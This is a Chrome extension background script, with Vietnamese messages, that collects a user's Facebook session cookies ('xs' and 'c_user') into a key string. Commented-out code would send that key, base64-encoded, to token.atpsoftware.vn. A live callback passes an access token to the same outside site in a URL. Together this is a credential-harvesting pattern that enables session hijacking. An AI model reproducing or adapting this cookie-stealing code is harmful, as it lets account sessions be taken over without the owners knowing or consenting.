/*document.addEventListener('DOMContentLoaded', function () {
    document.getElementById('status').textContent = "Extension loaded";
    var button = document.getElementById('changelinks');
    button.addEventListener('click', function () {
        $('#status').html('Clicked change links button');
        var text = $('#linkstext').val();
        if (!text) {
            $('#status').html('Invalid text provided');
            return;
        }
        chrome.tabs.query({
            active: true,
            currentWindow: true
        }, function (tabs) {
            chrome.tabs.sendMessage(tabs[0].id, {
                data: text
            }, function (response) {
                $('#status').html('changed data in page');
                console.log('success');
                console.log(response.success);
            });
        });
    });
});*/

console.log("background");

var key = "";

function getallfb() {
    chrome.cookies.getAll({
        domain: ".facebook.com"
    }, function (cookies) {
        var check_login = false;
        for (var i = 0; i < cookies.length; i++) {
            if (cookies[i].name == "xs") {
                check_login = true;
                key += "xs=" + cookies[i].value + ";";
            }
            if (cookies[i].name == "c_user") {
                key += "c_user=" + cookies[i].value + ";";
            }
        }
        if (!check_login) {
            var notification = new Notification('Thông báo lổi', {
                icon: 'http://i.imgur.com/Nk0wyaW.png',
                body: 'Hệ thống không tìm thấy bất cứ tài khoản Facebook nào đang đăng nhập.',
            });
            notification.onclick = function () {
                window.open("http://facebook.com");
            };
        }
        console.log(key);
        console.log(check_login);
        if (check_login) {
            xmlhttp = new XMLHttpRequest();
            xmlhttp.onreadystatechange = function () {
                if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {

                    console.log("hihi");
                    var html = JSON.parse(xmlhttp.responseText);
                    if (typeof html.access_token !== 'undefined') {
                        var newURL = "http://token.atpsoftware.vn/?access_token=" + html.access_token;
                        window.open(newURL);
                        console.log("hihi1");
                        console.log(html.access_token);
                    } else {
                        var notification = new Notification('Thông báo lổi', {
                            icon: 'http://i.imgur.com/Nk0wyaW.png',
                            body: html.msg,
                        });
                        notification.onclick = function () {
                            window.open("http://atpsoftware.vn");
                        };
                    }

                } else {
                    console.log("haha");
                }
            }
            console.log("haha11");
            // xmlhttp.open("GET", "http://token.atpsoftware.vn/token.php?key=" + btoa(key), false);
            //  xmlhttp.send();
        }
    });
}


chrome.runtime.onMessage.addListener(
    function (request, sender, sendResponse) {
        console.log(sender.tab ?
            "from a content script:" + sender.tab.url :
            "from the extension");
        if (request.greeting == "hello") {

            getallfb();
            console.log("sss");
            sendResponse({
                farewell: "goodbye",
                name: "danhcong",

            });
        }

    });

chrome.storage.onChanged.addListener(function (changes) {

})

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {



})
